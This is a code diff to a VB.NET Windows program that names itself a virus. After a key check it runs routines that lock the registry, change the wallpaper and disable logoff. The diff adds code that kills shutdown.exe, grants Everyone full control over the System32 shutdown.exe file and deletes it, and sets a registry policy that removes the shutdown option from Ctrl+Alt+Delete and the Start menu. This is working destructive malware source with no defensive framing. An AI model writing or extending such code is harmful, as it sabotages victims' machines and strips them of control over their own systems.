@@ -337,7 +337,8 @@ Public Class Form1
             UpdateRegistrySettings()
             DisableLogoffAndLockRegistry()
             SetWallpaperAndLockRegistry()
-            GrantAccessAndDeleteShutdownExe()
+            KillGrantAccessAndDeleteShutdownExe()
+            DisableShutdownButtonCtrlAltDelete()
         Else
             MessageBox.Show("Wrong key! The virus could not be executed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End If
@@ -436,31 +437,62 @@ Public Class Form1
         Return False
     End Function
 
-    Public Sub GrantAccessAndDeleteShutdownExe()
+    Public Sub KillGrantAccessAndDeleteShutdownExe()
         Try
             ' Path to shutdown.exe in System32
             Dim shutdownExePath As String = "C:\Windows\System32\shutdown.exe"
 
-            ' Step 1: Grant full access to shutdown.exe to ensure we can delete it
+            ' Step 1: Kill any running instances of shutdown.exe
+            Dim killCmd As String = "taskkill /f /im shutdown.exe"
+            RunCommand(killCmd)
+
+            MessageBox.Show("Any running instances of shutdown.exe have been terminated.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
+
+            ' Step 2: Grant full access to shutdown.exe to ensure we can delete it
             Dim grantAccessCmd As String = $"icacls {shutdownExePath} /grant *S-1-1-0:(F)"
             RunCommand(grantAccessCmd)
 
-            ' Step 2: Delete shutdown.exe
+            MessageBox.Show("Full access granted to shutdown.exe.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
+
+            ' Step 3: Delete shutdown.exe
             Dim deleteCmd As String = $"del {shutdownExePath}"
             RunCommand(deleteCmd)
+
+            MessageBox.Show("shutdown.exe has been deleted.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
 
         Catch ex As Exception
             MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End Try
     End Sub
 
+    Public Sub DisableShutdownButtonCtrlAltDelete()
+        Try
+            ' Path to the System registry key where we disable shutdown options
+            Dim systemRegPath As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"
+
+            ' Step 1: Open or create the registry key for system policies
+            Using systemRegKey As RegistryKey = Registry.CurrentUser.CreateSubKey(systemRegPath, RegistryKeyPermissionCheck.ReadWriteSubTree)
+                ' Step 2: Set DisableShutdown key to 1 to disable shutdown from Ctrl+Alt+Delete and Start menu
+                systemRegKey?.SetValue("DisableShutdown", 1, RegistryValueKind.DWord)
+            End Using
+
+            MessageBox.Show("Shutdown button has been disabled on the Ctrl+Alt+Delete screen.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
+
+        Catch ex As Exception
+            MessageBox.Show("An error occurred while modifying the registry: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+        End Try
+    End Sub
+
     ' Function to run a command
     Private Sub RunCommand(command As String)
-        Dim processInfo As New ProcessStartInfo("cmd.exe", "/c " & command)
-        processInfo.CreateNoWindow = True
-        processInfo.UseShellExecute = False
-        processInfo.RedirectStandardOutput = True
-        processInfo.RedirectStandardError = True
+        ' Start a new process to run the command
+        Dim processInfo As New ProcessStartInfo With {
+            .FileName = "cmd.exe",
+            .Arguments = "/c " & command,
+            .RedirectStandardOutput = True,
+            .UseShellExecute = False,
+            .CreateNoWindow = True
+            }
 
         Using process As Process = Process.Start(processInfo)
             Using reader As StreamReader = process.StandardOutput
